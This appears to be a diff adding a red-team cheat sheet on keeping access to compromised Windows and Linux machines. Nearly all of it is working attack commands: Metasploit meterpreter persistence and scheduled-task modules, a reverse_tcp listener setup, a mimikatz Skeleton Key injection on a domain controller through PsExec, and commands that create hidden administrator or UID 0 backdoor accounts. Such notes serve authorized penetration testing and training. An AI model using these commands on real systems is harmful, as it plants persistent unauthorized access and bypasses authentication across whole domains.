@@ -1,0 +1,57 @@
+metsvc
+	Metasploit meterpreter
+		run metsvc -A
+
+Persistence Scripts
+	Metasploit meterpreter
+		run persistence -h
+			**THIS IS A DANGEROUS MODULE TO RUN**
+			Opens a port on the machine without credentials
+			Must be explicitly closed and removed from registry when done
+	
+		exploit/windows/local/persistence
+
+		exploit/windows/local/registry_persistence
+
+Scheduled Tasks
+	Metasploit meterpreter
+		run scheduleme
+		run schtasksabuse
+
+	THESE ARE DANGEROUS MODULES TO RUN
+		Opens a port on the machine without credentials
+		Must be explicitly closed and removed from registry when done
+
+	Requires listener (e.g. reverse_tcp listening on 443)
+		use /exploit/multi/handler
+		set payload windows/meterpreter/reverse_tcp  
+		set port 443   
+
+
+Skeleton Key
+	adds a master password ("mimikatz") for all users
+	using mimikatz on DC
+		PsExec.exe \\<DC_hostname> -accepteula cmd /c (cd <remote mimikatz folder> ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
+
+
+Add a User
+	Windows
+		net user <username> <password> /add
+		net localgroup administrators <username> /add
+		net localgroup "Remote Desktop Users" <username> /add
+	
+		**loud, but may not be caught**
+
+		Get Golden Ticket privileged access (see Post-Compromise: Active Directory) and create user(s) w/ admin priv on any and all machines
+
+			WMI
+				wmic /node:<DC_hostname> process call create "net user /add <username> <password>"
+
+			promote user to Admin group using PS
+				$s=New-PSSession -computername <DC_hostname>
+
+				Invoke-Command -session $s -scriptblock {add-ADGroupMember -identity "Administrators" -Members <username>}
+	
+	Linux 
+		/usr/sbin/useradd –g 0 –u 0 –o user
+		echo user:password | /usr/sbin/chpasswd
